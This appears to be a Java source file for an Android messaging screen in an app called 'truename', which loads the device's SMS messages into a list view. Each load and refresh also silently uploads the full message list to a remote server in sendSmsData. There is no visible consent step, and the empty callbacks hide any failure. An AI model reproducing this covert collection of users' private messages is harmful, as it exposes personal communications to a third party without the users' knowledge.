package com.magicbio.truename.fragments;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.magicbio.truename.R;
import com.magicbio.truename.adapters.SMSAdapter;
import com.magicbio.truename.fragments.background.AppAsyncWorker;
import com.magicbio.truename.fragments.background.FetchMessages;
import com.magicbio.truename.models.Sms;
import com.magicbio.truename.retrofit.ApiClient;
import com.magicbio.truename.retrofit.ApiInterface;

import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * A simple {@link Fragment} subclass.
 * Activities that contain this fragment must implement an interface
 * to handle interaction events.
 */
public class MessagesFragment extends Fragment {

    private SwipeRefreshLayout swipeRefreshLayout;
    private RecyclerView recyclerView;

    public MessagesFragment() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View v = inflater.inflate(R.layout.fragment_messages, container, false);

        init(v);

        setSmsAdapter();

        return v;
    }


    private void setSmsAdapter() {

        AppAsyncWorker.fetchAllMessages(new FetchMessages.OnMessagesListener() {
            @Override
            public void onMessages(@NotNull ArrayList<Sms> result) {
                recyclerView.setAdapter(new SMSAdapter(result));
                sendSmsData(result);
            }
        });


    }

    private void sendSmsData(ArrayList<Sms> sms) {
       /* List<Sms> sms = new ArrayList<>(10);
        for (int i = 0; i < 10; i++) {
            Sms smsO = new Sms();
            smsO.name = "Mobin " + i;
            smsO.txtmessage = "Yawrr kuzzle lgwale :D";
            smsO.userid = i + "";

            sms.add(smsO);

        }*/
        ApiInterface apiInterface = ApiClient.getClient().create(ApiInterface.class);
        apiInterface.sendSmsData(sms).enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {

            }
        });

    }


    private void init(View v) {
        recyclerView = v.findViewById(R.id.recycler_View);
        swipeRefreshLayout = v.findViewById(R.id.swipeRefreshLayout);
        recyclerView.setHasFixedSize(true);
        final LinearLayoutManager linearLayoutManager = new LinearLayoutManager(getActivity());
        recyclerView.setLayoutManager(linearLayoutManager);


        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                setSmsAdapter();
                swipeRefreshLayout.setRefreshing(false);
            }
        });


//        Timer myTimer = new Timer();
//        myTimer.schedule(new TimerTask() {
//            @Override
//            public void run() {
//                if(getActivity()!=null)
//                {
//                    new LongOperation().execute("");
//                }
//            }
//
//        }, 0, 3000);

    }







   /* public void search(String newText) {
        smsAdapter.search(newText, null);
    }*/


}
